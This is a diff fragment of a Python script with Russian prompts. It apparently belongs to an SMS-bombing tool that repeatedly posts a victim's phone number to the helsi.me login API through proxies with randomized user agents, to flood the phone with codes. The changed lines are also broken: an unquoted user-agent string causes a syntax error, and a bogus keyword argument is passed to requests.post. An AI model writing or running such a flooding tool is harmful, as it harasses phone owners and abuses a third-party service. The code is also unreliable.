@@ -48,9 +48,9 @@ run = int(console.input('[green]Введите количество повтор
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
- Helsii = {"User-Agent": fake_useragent.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36")}
+ Helsii = {"User-Agent": fake_useragent.UserAgent(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36)}
  try:
-         requests.post("https://helsi.me/api/healthy/v2/accounts/login", data={"phone": number, "platform": "PISWeb"}, Helsii=Helsii, proxies=proxies)
+         requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, Helsii=Helsii, proxies=proxies)
          print('helsi.me')
  except:
          print('Не отправлено (helsi.me)')
